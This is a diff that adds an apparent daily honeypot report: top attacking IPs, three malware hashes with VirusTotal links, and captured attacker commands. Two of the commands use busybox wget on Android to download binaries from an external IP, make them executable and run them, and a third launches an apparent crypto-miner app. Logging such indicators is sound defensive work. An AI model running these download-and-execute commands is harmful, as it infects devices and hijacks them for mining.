@@ -1,0 +1,18 @@
+Top 5 IPs for 2023-12-09:
+179.185.90.114
+18.178.168.169
+43.133.77.92
+43.153.213.112
+43.153.219.123
+
+Malware seen: 
+Hash: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+Hash: 71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+Hash: df4646e1bf9615d94a8304f3b20a9fb828ff489b16e5d6dc4673d24fa6a98f5c
+https://www.virustotal.com/gui/file/df4646e1bf9615d94a8304f3b20a9fb828ff489b16e5d6dc4673d24fa6a98f5c
+
+cd /data/local/tmp/; busybox wget http://45.95.146.55/xaarch64; chmod 777 xaarch64; ./xaarch64 android.aarch64
+am start -n com.ufo.miner/com.example.test.MainActivity
+cd /data/local/tmp/; busybox wget http://45.95.146.55/xarm7; chmod 777 xarm7; ./xarm7 android.arm
